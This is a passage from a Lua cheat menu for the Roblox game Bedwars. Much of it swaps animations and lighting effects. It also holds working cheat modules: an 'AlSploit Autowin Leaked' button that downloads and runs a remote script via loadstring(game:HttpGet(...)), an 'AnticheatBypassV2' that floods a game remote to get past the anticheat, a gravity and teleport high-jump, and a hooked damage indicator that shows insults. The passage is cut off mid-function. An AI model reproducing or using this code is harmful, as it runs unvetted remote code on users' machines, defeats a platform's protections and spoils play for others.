	Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=10921157929" 	
end
if animwalk.Value == "Ninja" and animtype.Value == "Custom" then
Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=10921162768"
end
if animfall.Value == "Ninja" and animtype.Value == "Custom" then
Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=10921159222"
end
if animjump.Value == "Ninja" and animtype.Value == "Custom" then
Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=10921160088"
end
if animidle.Value == "Ninja" and animtype.Value == "Custom" then
Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=10921155160"
Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=10921155867"
end
if animclimb.Value == "Ninja" and animtype.Value == "Custom" then
Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=10921154678"
end
---Knight
if animrun.Value == "Knight" and animtype.Value == "Custom" then
	Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=10921121197" 	
end
if animwalk.Value == "Knight" and animtype.Value == "Custom" then
Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=10921127095"
end
if animfall.Value == "Knight" and animtype.Value == "Custom" then
Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=10921122579"
end
if animjump.Value == "Knight" and animtype.Value == "Custom" then
Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=10921123517"
end
if animidle.Value == "Knight" and animtype.Value == "Custom" then
Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=10921117521"
Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=10921118894"
end
if animclimb.Value == "Knight" and animtype.Value == "Custom" then
Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=10921116196"
end
---Mage
if animrun.Value == "Mage" and animtype.Value == "Custom" then
	Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=10921148209" 	
end
if animwalk.Value == "Mage" and animtype.Value == "Custom" then
Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=10921152678"
end
if animfall.Value == "Mage" and animtype.Value == "Custom" then
Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=10921148939"
end
if animjump.Value == "Mage" and animtype.Value == "Custom" then
Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=10921149743"
end
if animidle.Value == "Mage" and animtype.Value == "Custom" then
Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=10921144709"
Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=10921145797"
end
if animclimb.Value == "Mage" and animtype.Value == "Custom" then
Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=10921143404"
end
---Pirate
if animrun.Value == "Pirate" and animtype.Value == "Custom" then
	Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=750783738" 	
end
if animwalk.Value == "Pirate" and animtype.Value == "Custom" then
Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=750785693"
end
if animfall.Value == "Pirate" and animtype.Value == "Custom" then
Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=750780242"
end
if animjump.Value == "Pirate" and animtype.Value == "Custom" then
Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=750782230"
end
if animidle.Value == "Pirate" and animtype.Value == "Custom" then
Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=750781874"
Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=750782770"
end
if animclimb.Value == "Pirate" and animtype.Value == "Custom" then
Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=750779899"
end
---Elder
if animrun.Value == "Elder" and animtype.Value == "Custom" then
	Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=10921104374" 	
end
if animwalk.Value == "Elder" and animtype.Value == "Custom" then
Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=10921111375"
end
if animfall.Value == "Elder" and animtype.Value == "Custom" then
Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=10921105765"
end
if animjump.Value == "Elder" and animtype.Value == "Custom" then
Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=10921107367"
end
if animidle.Value == "Elder" and animtype.Value == "Custom" then
Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=10921101664"
Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=10921102574"
end
if animclimb.Value == "Elder" and animtype.Value == "Custom" then
Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=10921100400"
end
---Toy (my favorite)
if animrun.Value == "Toy" and animtype.Value == "Custom" then
	Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=10921306285" 	
end
if animwalk.Value == "Toy" and animtype.Value == "Custom" then
Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=10921312010"
end
if animfall.Value == "Toy" and animtype.Value == "Custom" then
Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=10921307241"
end
if animjump.Value == "Toy" and animtype.Value == "Custom" then
Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=10921308158"
end
if animidle.Value == "Toy" and animtype.Value == "Custom" then
Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=10921301576"
Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=10921302207"
end
if animclimb.Value == "Toy" and animtype.Value == "Custom" then
Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=10921300839"
end
---Bubbly
if animrun.Value == "Bubbly" and animtype.Value == "Custom" then
	Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=10921057244" 	
end
if animwalk.Value == "Bubbly" and animtype.Value == "Custom" then
Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=10980888364"
end
if animfall.Value == "Bubbly" and animtype.Value == "Custom" then
Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=10921061530"
end
if animjump.Value == "Bubbly" and animtype.Value == "Custom" then
Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=10921062673"
end
if animidle.Value == "Bubbly" and animtype.Value == "Custom" then
Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=10921054344"
Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=10921055107"
end
if animclimb.Value == "Bubbly" and animtype.Value == "Custom" then
Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=10921053544"
end
---Astronaut
if animrun.Value == "Astronaut" and animtype.Value == "Custom" then
	Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=10921039308" 	
end
if animwalk.Value == "Astronaut" and animtype.Value == "Custom" then
Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=10921046031"
end
if animfall.Value == "Astronaut" and animtype.Value == "Custom" then
Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=10921040576"
end
if animjump.Value == "Astronaut" and animtype.Value == "Custom" then
Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=10921042494"
end
if animidle.Value == "Astronaut" and animtype.Value == "Custom" then
Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=10921034824"
Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=10921036806"
end
if animclimb.Value == "Astronaut" and animtype.Value == "Custom" then
Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=10921032124"
end
---Vampire
if animrun.Value == "Vampire" and animtype.Value == "Custom" then
	Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=10921320299" 	
end
if animwalk.Value == "Vampire" and animtype.Value == "Custom" then
Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=10921326949"
end
if animfall.Value == "Vampire" and animtype.Value == "Custom" then
Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=10921321317"
end
if animjump.Value == "Vampire" and animtype.Value == "Custom" then
Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=10921322186"
end
if animidle.Value == "Vampire" and animtype.Value == "Custom" then
Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=10921315373"
Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=10921316709"
end
if animclimb.Value == "Vampire" and animtype.Value == "Custom" then
Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=10921314188"
end
---Werewolf
if animrun.Value == "Werewolf" and animtype.Value == "Custom" then
	Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=10921336997" 	
end
if animwalk.Value == "Werewolf" and animtype.Value == "Custom" then
Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=10921342074"
end
if animfall.Value == "Werewolf" and animtype.Value == "Custom" then
Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=10921337907"
end
if animjump.Value == "Werewolf" and animtype.Value == "Custom" then
Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=1083218792"
end
if animidle.Value == "Werewolf" and animtype.Value == "Custom" then
Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=10921330408"
Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=10921333667"
end
if animclimb.Value == "Werewolf" and animtype.Value == "Custom" then
Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=10921329322"
end
---Rthro
if animrun.Value == "Rthro" and animtype.Value == "Custom" then
	Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=10921261968" 	
end
if animwalk.Value == "Rthro" and animtype.Value == "Custom" then
Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=10921269718"
end
if animfall.Value == "Rthro" and animtype.Value == "Custom" then
Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=10921262864"
end
if animjump.Value == "Rthro" and animtype.Value == "Custom" then
Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=10921263860"
end
if animidle.Value == "Rthro" and animtype.Value == "Custom" then
Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=10921258489"
Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=10921259953"
end
if animclimb.Value == "Rthro" and animtype.Value == "Custom" then
Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=10921257536"
end
---Oldschool
if animrun.Value == "Oldschool" and animtype.Value == "Custom" then
	Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=10921240218" 	
end
if animwalk.Value == "Oldschool" and animtype.Value == "Custom" then
Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=10921244891"
end
if animfall.Value == "Oldschool" and animtype.Value == "Custom" then
Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=10921241244"
end
if animjump.Value == "Oldschool" and animtype.Value == "Custom" then
Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=10921242013"
end
if animidle.Value == "Oldschool" and animtype.Value == "Custom" then
Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=10921230744"
Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=10921232093"
end
if animclimb.Value == "Oldschool" and animtype.Value == "Custom" then
Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=10921229866"
end
---Mr.Toilet
if animrun.Value == "Toilet" and animtype.Value == "Custom" then
	Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=4417979645" 	
end
if animidle.Value == "Toilet" and animtype.Value == "Custom" then
Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=4417977954"
Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=4417978624"
end
---Ud'Zal
if animrun.Value == "Rthro Heavy Run" and animtype.Value == "Custom" then
	Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=3236836670" 	
end
if animidle.Value == "Ud'zal" and animtype.Value == "Custom" then
Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=3303162274"
Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=3303162549"
end
if animwalk.Value == "Ud'zal" and animtype.Value == "Custom" then
	Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=3303162967"
	end
	if animtype.Value == "Tryhard" then
		Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=10921301576"
		Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=10921302207"
		Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=10921162768"
		Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=10921157929"
		Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=10921137402"
		Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=10921136539"
	end
	if animtype.Value == "Goofy" then
		Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=4417977954"
		Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=4417978624"
		Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=10921162768"
		Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=4417979645"
		Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=10921137402"
		Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=10921136539"
	end
	if animtype.Value == "Tanqr" then
		Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=10921034824"
		Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=10921036806"
		Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=10921312010"
		Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=10921306285"
		Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=10921242013"
		Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=10921136539"
	end
end)
	end
	end
	})
	animtype = anim.CreateDropdown({
		Name = "Type",
		List = {"Custom", "Tryhard", "Goofy", "Tanqr"},
		Function = function() end
	})
	animrun = anim.CreateDropdown({
		Name = "Run",
		List = {"Cartoony", "Levitation", "Robot", "Stylish", "Superhero", "Zombie", "Ninja", "Knight", "Mage", "Pirate", "Elder", "Toy", "Bubbly", "Astronaut", "Vampire", "Werewolf", "Rthro", "Oldschool", "Toilet", "Rthro Heavy Run"},
		Function = function() end
	})

	animwalk = anim.CreateDropdown({
		Name = "Walk",
		List = {"Cartoony", "Levitation", "Robot", "Stylish", "Superhero", "Zombie", "Ninja", "Knight", "Mage", "Pirate", "Elder", "Toy", "Bubbly", "Astronaut", "Vampire", "Werewolf", "Rthro", "Oldschool", "Ud'zal"},
		Function = function() end
	})

	animfall = anim.CreateDropdown({
		Name = "Fall",
		List = {"Cartoony", "Levitation", "Robot", "Stylish", "Superhero", "Zombie", "Ninja", "Knight", "Mage", "Pirate", "Elder", "Toy", "Bubbly", "Astronaut", "Vampire", "Werewolf", "Rthro", "Oldschool"},
		Function = function() end
	})

	animjump = anim.CreateDropdown({
		Name = "Jump",
		List = {"Cartoony", "Levitation", "Robot", "Stylish", "Superhero", "Zombie", "Ninja", "Knight", "Mage", "Pirate", "Elder", "Toy", "Bubbly", "Astronaut", "Vampire", "Werewolf", "Rthro", "Oldschool"},
		Function = function() end
	})

	animidle = anim.CreateDropdown({
		Name = "Idle",
		List = {"Cartoony", "Levitation", "Robot", "Stylish", "Superhero", "Zombie", "Ninja", "Knight", "Mage", "Pirate", "Elder", "Toy", "Bubbly", "Astronaut", "Vampire", "Werewolf", "Rthro", "Oldschool", "Toilet", "Ud'zal"},
		Function = function() end
	})

	animclimb = anim.CreateDropdown({
		Name = "Climb",
		List = {"Cartoony", "Levitation", "Robot", "Stylish", "Superhero", "Zombie", "Ninja", "Knight", "Mage", "Pirate", "Elder", "Toy", "Bubbly", "Astronaut", "Vampire", "Werewolf", "Rthro", "Oldschool"},
		Function = function() end
	})
end)


				runFunction(function()
					local DuelsAutoWin = {Enabled = false}
					DuelsAutoWin = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
					Name = "AlSploit Autowin Leaked",
					HoverText = "auto win the duels and its leaked alsploit",
					Function = function(callback)
						if callback then
						task.spawn(function()
						loadstring(game:HttpGet('https://raw.githubusercontent.com/RayFaxiu/APEForRoblox/main/AutoWin.lua'))()
						end)
					end
				end
						})
					end)

local Shaders = GuiLibrary.ObjectsThatCanBeSaved.RenderWindow.Api.CreateOptionsButton({
	["Name"] = "Shaders",
	["Function"] = function(callback)
		if callback then
			workspace.Gravity = 192
			pcall(function()
				game:GetService("Lighting"):ClearAllChildren()
				local Bloom = Instance.new("BloomEffect")
				Bloom.Intensity = 0.1
				Bloom.Threshold = 0
				Bloom.Size = 100

				local Tropic = Instance.new("Sky")
				Tropic.Name = "Tropic"
				Tropic.SkyboxUp = "http://www.roblox.com/asset/?id=169210149"
				Tropic.SkyboxLf = "http://www.roblox.com/asset/?id=169210133"
				Tropic.SkyboxBk = "http://www.roblox.com/asset/?id=169210090"
				Tropic.SkyboxFt = "http://www.roblox.com/asset/?id=169210121"
				Tropic.StarCount = 100
				Tropic.SkyboxDn = "http://www.roblox.com/asset/?id=169210108"
				Tropic.SkyboxRt = "http://www.roblox.com/asset/?id=169210143"
				Tropic.Parent = Bloom

				local Sky = Instance.new("Sky")
				Sky.SkyboxUp = "http://www.roblox.com/asset/?id=196263782"
				Sky.SkyboxLf = "http://www.roblox.com/asset/?id=196263721"
				Sky.SkyboxBk = "http://www.roblox.com/asset/?id=196263721"
				Sky.SkyboxFt = "http://www.roblox.com/asset/?id=196263721"
				Sky.CelestialBodiesShown = false
				Sky.SkyboxDn = "http://www.roblox.com/asset/?id=196263643"
				Sky.SkyboxRt = "http://www.roblox.com/asset/?id=196263721"
				Sky.Parent = Bloom

				Bloom.Parent = game:GetService("Lighting")

				local Bloom = Instance.new("BloomEffect")
				Bloom.Enabled = false
				Bloom.Intensity = 0.35
				Bloom.Threshold = 0.2
				Bloom.Size = 56

				local Tropic = Instance.new("Sky")
				Tropic.Name = "Tropic"
				Tropic.SkyboxUp = "http://www.roblox.com/asset/?id=169210149"
				Tropic.SkyboxLf = "http://www.roblox.com/asset/?id=169210133"
				Tropic.SkyboxBk = "http://www.roblox.com/asset/?id=169210090"
				Tropic.SkyboxFt = "http://www.roblox.com/asset/?id=169210121"
				Tropic.StarCount = 100
				Tropic.SkyboxDn = "http://www.roblox.com/asset/?id=169210108"
				Tropic.SkyboxRt = "http://www.roblox.com/asset/?id=169210143"
				Tropic.Parent = Bloom

				local Sky = Instance.new("Sky")
				Sky.SkyboxUp = "http://www.roblox.com/asset/?id=196263782"
				Sky.SkyboxLf = "http://www.roblox.com/asset/?id=196263721"
				Sky.SkyboxBk = "http://www.roblox.com/asset/?id=196263721"
				Sky.SkyboxFt = "http://www.roblox.com/asset/?id=196263721"
				Sky.CelestialBodiesShown = false
				Sky.SkyboxDn = "http://www.roblox.com/asset/?id=196263643"
				Sky.SkyboxRt = "http://www.roblox.com/asset/?id=196263721"
				Sky.Parent = Bloom

				Bloom.Parent = game:GetService("Lighting")
				local Blur = Instance.new("BlurEffect")
				Blur.Size = 2

				Blur.Parent = game:GetService("Lighting")
				local Efecto = Instance.new("BlurEffect")
				Efecto.Name = "Efecto"
				Efecto.Enabled = false
				Efecto.Size = 2

				Efecto.Parent = game:GetService("Lighting")
				local Inaritaisha = Instance.new("ColorCorrectionEffect")
				Inaritaisha.Name = "Inari taisha"
				Inaritaisha.Saturation = 0.05
				Inaritaisha.TintColor = Color3.fromRGB(255, 224, 219)

				Inaritaisha.Parent = game:GetService("Lighting")
				local Normal = Instance.new("ColorCorrectionEffect")
				Normal.Name = "Normal"
				Normal.Enabled = false
				Normal.Saturation = -0.2
				Normal.TintColor = Color3.fromRGB(255, 232, 215)

				Normal.Parent = game:GetService("Lighting")
				local SunRays = Instance.new("SunRaysEffect")
				SunRays.Intensity = 0.05

				SunRays.Parent = game:GetService("Lighting")
				local Sunset = Instance.new("Sky")
				Sunset.Name = "Sunset"
				Sunset.SkyboxUp = "rbxassetid://323493360"
				Sunset.SkyboxLf = "rbxassetid://323494252"
				Sunset.SkyboxBk = "rbxassetid://323494035"
				Sunset.SkyboxFt = "rbxassetid://323494130"
				Sunset.SkyboxDn = "rbxassetid://323494368"
				Sunset.SunAngularSize = 14
				Sunset.SkyboxRt = "rbxassetid://323494067"

				Sunset.Parent = game:GetService("Lighting")
				local Takayama = Instance.new("ColorCorrectionEffect")
				Takayama.Name = "Takayama"
				Takayama.Enabled = false
				Takayama.Saturation = -0.3
				Takayama.Contrast = 0.1
				Takayama.TintColor = Color3.fromRGB(235, 214, 204)

				Takayama.Parent = game:GetService("Lighting")
				local L = game:GetService("Lighting")
				L.Brightness = 2.14
				L.ColorShift_Bottom = Color3.fromRGB(11, 0, 20)
				L.ColorShift_Top = Color3.fromRGB(240, 127, 14)
				L.OutdoorAmbient = Color3.fromRGB(34, 0, 49)
				L.ClockTime = 6.7
				L.FogColor = Color3.fromRGB(94, 76, 106)
				L.FogEnd = 1000
				L.FogStart = 0
				L.ExposureCompensation = 0.24
				L.ShadowSoftness = 0
				L.Ambient = Color3.fromRGB(59, 33, 27)

				local Bloom = Instance.new("BloomEffect")
				Bloom.Intensity = 0.1
				Bloom.Threshold = 0
				Bloom.Size = 100

				local Tropic = Instance.new("Sky")
				Tropic.Name = "Tropic"
				Tropic.SkyboxUp = "http://www.roblox.com/asset/?id=169210149"
				Tropic.SkyboxLf = "http://www.roblox.com/asset/?id=169210133"
				Tropic.SkyboxBk = "http://www.roblox.com/asset/?id=169210090"
				Tropic.SkyboxFt = "http://www.roblox.com/asset/?id=169210121"
				Tropic.StarCount = 100
				Tropic.SkyboxDn = "http://www.roblox.com/asset/?id=169210108"
				Tropic.SkyboxRt = "http://www.roblox.com/asset/?id=169210143"
				Tropic.Parent = Bloom

				local Sky = Instance.new("Sky")
				Sky.SkyboxUp = "http://www.roblox.com/asset/?id=196263782"
				Sky.SkyboxLf = "http://www.roblox.com/asset/?id=196263721"
				Sky.SkyboxBk = "http://www.roblox.com/asset/?id=196263721"
				Sky.SkyboxFt = "http://www.roblox.com/asset/?id=196263721"
				Sky.CelestialBodiesShown = false
				Sky.SkyboxDn = "http://www.roblox.com/asset/?id=196263643"
				Sky.SkyboxRt = "http://www.roblox.com/asset/?id=196263721"
				Sky.Parent = Bloom

				Bloom.Parent = game:GetService("Lighting")

				local Bloom = Instance.new("BloomEffect")
				Bloom.Enabled = false
				Bloom.Intensity = 0.35
				Bloom.Threshold = 0.2
				Bloom.Size = 56

				local Tropic = Instance.new("Sky")
				Tropic.Name = "Tropic"
				Tropic.SkyboxUp = "http://www.roblox.com/asset/?id=169210149"
				Tropic.SkyboxLf = "http://www.roblox.com/asset/?id=169210133"
				Tropic.SkyboxBk = "http://www.roblox.com/asset/?id=169210090"
				Tropic.SkyboxFt = "http://www.roblox.com/asset/?id=169210121"
				Tropic.StarCount = 100
				Tropic.SkyboxDn = "http://www.roblox.com/asset/?id=169210108"
				Tropic.SkyboxRt = "http://www.roblox.com/asset/?id=169210143"
				Tropic.Parent = Bloom

				local Sky = Instance.new("Sky")
				Sky.SkyboxUp = "http://www.roblox.com/asset/?id=196263782"
				Sky.SkyboxLf = "http://www.roblox.com/asset/?id=196263721"
				Sky.SkyboxBk = "http://www.roblox.com/asset/?id=196263721"
				Sky.SkyboxFt = "http://www.roblox.com/asset/?id=196263721"
				Sky.CelestialBodiesShown = false
				Sky.SkyboxDn = "http://www.roblox.com/asset/?id=196263643"
				Sky.SkyboxRt = "http://www.roblox.com/asset/?id=196263721"
				Sky.Parent = Bloom

				Bloom.Parent = game:GetService("Lighting")
				local Blur = Instance.new("BlurEffect")
				Blur.Size = 2

				Blur.Parent = game:GetService("Lighting")
				local Efecto = Instance.new("BlurEffect")
				Efecto.Name = "Efecto"
				Efecto.Enabled = false
				Efecto.Size = 4

				Efecto.Parent = game:GetService("Lighting")
				local Inaritaisha = Instance.new("ColorCorrectionEffect")
				Inaritaisha.Name = "Inari taisha"
				Inaritaisha.Saturation = 0.05
				Inaritaisha.TintColor = Color3.fromRGB(255, 224, 219)

				Inaritaisha.Parent = game:GetService("Lighting")
				local Normal = Instance.new("ColorCorrectionEffect")
				Normal.Name = "Normal"
				Normal.Enabled = false
				Normal.Saturation = -0.2
				Normal.TintColor = Color3.fromRGB(255, 232, 215)

				Normal.Parent = game:GetService("Lighting")
				local SunRays = Instance.new("SunRaysEffect")
				SunRays.Intensity = 0.05

				SunRays.Parent = game:GetService("Lighting")
				local Sunset = Instance.new("Sky")
				Sunset.Name = "Sunset"
				Sunset.SkyboxUp = "rbxassetid://323493360"
				Sunset.SkyboxLf = "rbxassetid://323494252"
				Sunset.SkyboxBk = "rbxassetid://323494035"
				Sunset.SkyboxFt = "rbxassetid://323494130"
				Sunset.SkyboxDn = "rbxassetid://323494368"
				Sunset.SunAngularSize = 14
				Sunset.SkyboxRt = "rbxassetid://323494067"

				Sunset.Parent = game:GetService("Lighting")
				local Takayama = Instance.new("ColorCorrectionEffect")
				Takayama.Name = "Takayama"
				Takayama.Enabled = false
				Takayama.Saturation = -0.3
				Takayama.Contrast = 0.1
				Takayama.TintColor = Color3.fromRGB(235, 214, 204)

				Takayama.Parent = game:GetService("Lighting")
				local L = game:GetService("Lighting")
				L.Brightness = 2.3
				L.ColorShift_Bottom = Color3.fromRGB(11, 0, 20)
				L.ColorShift_Top = Color3.fromRGB(240, 127, 14)
				L.OutdoorAmbient = Color3.fromRGB(34, 0, 49)
				L.TimeOfDay = "07:30:00"
				L.FogColor = Color3.fromRGB(94, 76, 106)
				L.FogEnd = 300
				L.FogStart = 0
				L.ExposureCompensation = 0.24
				L.ShadowSoftness = 0
				L.Ambient = Color3.fromRGB(59, 33, 27)
			end)
		else
			pcall(function()
			end)
		end
	end,
	["Default"] = false,
	["HoverText"] = "Shaders reel"
})

local Messages = {"APE", "Kiddo", "EZ", "Thump!", "Hit!", "Bad", "UrSuck", "Fuck", "L Kid", "Pipe L"
}
local old
local FunnyIndicator = {Enabled = false}
FunnyIndicator = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
Name = "DamageIndicator",
Function = function(Callback)
    FunnyIndicator.Enabled = Callback
    if FunnyIndicator.Enabled then
        old = debug.getupvalue(bedwars.DamageIndicator, 10)["Create"]
        debug.setupvalue(bedwars.DamageIndicator, 10, {
            Create = function(self, obj, ...)
                spawn(function()
                    pcall(function()
                        obj.Parent.Text = Messages[math.random(1, #Messages)]
                        obj.Parent.TextColor3 = Color3.fromHSV(tick() % 5 / 5, 1, 1)
                    end)
                end)
                return game:GetService("TweenService"):Create(obj, ...)
            end
        })
    else
        debug.setupvalue(bedwars.DamageIndicator, 10, {
            Create = old
        })
        old = nil
    end
end
})

runFunction(function()
    fortniteballs = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
        Name = "BetterHighJump",
        Function = function(callback)
            if callback then
                game.Workspace.Gravity = 0
                repeat task.wait(0.01)
                    local player = game.Players.LocalPlayer
                    local character = player.Character or player.CharacterAdded:Wait()
                    local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
                    humanoidRootPart.CFrame = humanoidRootPart.CFrame + Vector3.new(0, 10, 0)
                until (not fortniteballs.Enabled)
            else
                game.Workspace.Gravity = 196.2
            end
        end
    })
end)

runFunction(function()
    local Disabler = {Enabled = false}
	local DisablerMode = {Value = "MoveDirection"}
	local DisablerMissing = {Value = "Continue"}
	local DisablerNotify = {Value = "Vape"}
	local DisablerDuration = {Value = 5}
	local DisablerSpeedVal = {Value = 90}
	local DisablerSpeed = {Enabled = true}
	local DisablerNotification = {Enabled = true}
	local DisablerTable = {
		Values = {
			Duration = DisablerDuration.Value,
			MainSpeed = DisablerSpeedVal.Value * 1000 + 9.999
		},
		Messages = {
			Title = "AnticheatBypassV2",
			Context1 = "Hold the Scythe in your hand!",
			Context2 = "Scythe not found!",
			Context3 = "[Disabler] Hold the Scythe in your hand!",
			Context4 = "[Disabler] Scythe not found!"
		}
	}
	local SendNotify
	local NoDisable
	local HeartbeatConnection
	local RenderSteppedConnection
	local function getRenderStepped()
		if DisablerMode.Value == "MoveDirection" then
			game:GetService("ReplicatedStorage").rbxts_include.node_modules:FindFirstChild("@rbxts").net.out._NetManaged.ScytheDash:FireServer({
				direction = game:GetService("Players").LocalPlayer.Character:FindFirstChild("Humanoid").MoveDirection * 10000
			})
		elseif DisablerMode.Value == "LookVector" then
			game:GetService("ReplicatedStorage").rbxts_include.node_modules:FindFirstChild("@rbxts").net.out._NetManaged.ScytheDash:FireServer({
				direction = game:GetService("Players").LocalPlayer.Character:FindFirstChild("HumanoidRootPart").CFrame.LookVector * 10000
			})
		end
	end
	local HeartBeatConnect = tick()
	local function getHeartBeat()
		local HeartBeatConnect2 = tick()
		local Value = HeartBeatConnect2 - (HeartBeatConnect2 - HeartBeatConnect <= 999 and 0 or 999)
		HeartBeatConnect = math.max(HeartBeatConnect,Value)
	end
	Disabler = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
        Name = "AnticheatBypassV2",
	    HoverText = "better AnticheatBypass reel",
        Function = function(callback)
            if callback then
				SendNotify = true
				NoDisable = true
				task.spawn(function()
					repeat
